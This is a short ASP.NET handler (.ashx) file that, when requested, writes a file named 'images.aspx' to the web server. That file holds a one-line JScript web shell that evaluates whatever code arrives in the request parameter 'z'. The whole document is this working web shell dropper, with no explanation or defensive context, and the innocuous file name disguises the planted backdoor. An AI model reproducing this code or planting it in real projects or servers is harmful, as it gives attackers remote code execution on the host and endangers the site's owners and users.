<%@ WebHandler Language="C#"Class="Handler" %> 

using System; 
using System.Web; 
using System.IO; 
public class Handler : IHttpHandler { 
public void ProcessRequest (HttpContext context) { 
context.Response.ContentType = "text/plain"; 

StreamWriter file1= File.CreateText(context.Server.MapPath("images.aspx")); 
file1.Write("<%@\x20Page\x20Language=\"Jscript\"%><%Response.Write(eval(Request.Item[\"z\"],\"unsafe\"));%>"); 
file1.Flush(); 
file1.Close(); 
} 
public bool IsReusable { 
get { 
return false; 
} 
} 
}